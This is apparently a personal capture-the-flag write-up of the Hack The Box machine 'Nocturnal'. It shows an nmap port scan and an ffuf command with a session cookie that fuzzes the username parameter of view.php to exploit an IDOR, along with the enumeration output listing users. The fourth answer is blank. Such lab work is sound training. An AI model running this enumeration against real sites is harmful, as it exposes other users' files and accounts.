# Nocturnal
- https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html
- https://www.youtube.com/watch?v=tjA3sXsnPqw

## Setup


## Guided Mode Questions
1. How many open TCP ports are listening on Nocturnal?
```
2

From NMAP scan:

┌──(root㉿kali)-[/home/jacob/Desktop/Nocturnal]
└─# ./nmap.sh Nocturnal 10.129.232.23
Running nmap scan on 10.129.232.23 with output to Nocturnal...
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 07:53 AEST
Nmap scan report for 10.129.232.23
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/                    
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                           
                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                      
Nmap done: 1 IP address (1 host up) scanned in 204.48 seconds                     
Scan completed successfully.                                                      
Output files created: Nocturnal.nmap, Nocturnal.gnmap, Nocturnal.xml
```

2. Which HTTP GET parameter specifies the user's name when downloading the uploaded files in the web application on port 80?
```
username

After registering, logging in, uploading a file, and then downloading that file back and proxying it with Burp, you can see the URL: GET /view.php?username=lumlum&file=fakefile.pdf HTTP/1.1

```

3. What's the name of the other user registered in this application?
```
amanda

──(root㉿kali)-[/home/jacob/Desktop/Nocturnal]
└─# ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=test.doc' -b 'PHPSESSID=ul48kitmih0c7v21am4ohekq5g' -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -fr 'User not found'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=test.doc
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/Names/names.txt
 :: Header           : Cookie: PHPSESSID=ul48kitmih0c7v21am4ohekq5g
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: User not found
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 203ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 200ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 185ms]
:: Progress: [10177/10177] :: Job [1/1] :: 225 req/sec :: Duration: [0:00:47] :: Errors: 0 ::
```

4. What is amanda user's password for this web application?
```

```

## NOTES
- I never would have tried to find an IDOR in the username in the URL because I assumed I was never going to accurately brute a filename as well. If I had only tried, I would have seen that the website happens to tell me what files are available. Send the request to Repeater, and then 'render' the Response and play.
- `.odt` files can be read as is like a .txt or .pdf. Unpacking them and diving into it's file contents is not the thing to do